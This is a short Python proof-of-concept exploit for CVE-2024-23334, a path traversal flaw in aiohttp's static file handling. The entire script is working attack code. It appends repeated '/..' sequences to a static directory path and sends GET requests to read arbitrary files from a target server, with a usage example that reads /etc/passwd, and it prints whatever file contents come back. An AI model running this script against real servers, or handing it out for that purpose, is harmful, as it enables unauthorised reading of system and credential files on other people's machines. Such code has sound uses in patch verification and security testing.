import argparse
import http.client
import textwrap
import urllib


def exploit(url, file, dir):
    parsed_url = urllib.parse.urlparse(url)
    conn = http.client.HTTPConnection(parsed_url.netloc)

    traversal  = "/.."
    payload = dir
    for i in range(15):
        payload += traversal

        print(f'''[+] Attempt {i}
                    Payload: {payload}{file}
        ''')

        conn.request("GET", f"{parsed_url.path}{payload}{file}")
        res = conn.getresponse()
        result = res.read()
        print(f"                    Status code: {res.status}")

        if res.status == 200:
            print("Respose: ")
            print(result.decode())
            break



if __name__ == "__main__":
    parser = argparse.ArgumentParser(
        description="PoC for CVE-2024-23334. LFI/Path-Traversal Vulnerability in Aiohttp",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=textwrap.dedent(''' Usage:
            exploit.py -u http://127.0.0.1 -f /etc/passwd -d /static
        ''')
    )

    parser.add_argument('-u', '--url', help="Aiohttp site url")
    parser.add_argument('-f', '--file', help="File to read")
    parser.add_argument('-d', '--directory', help="Directory with static files. Default: /static", default="/static")

    args = parser.parse_args()
    if args.url and args.file and args.directory:
        exploit(args.url, args.file, args.directory)
        print("Exploit complete")
    else:
        print("Error: One of the parameters is missing")
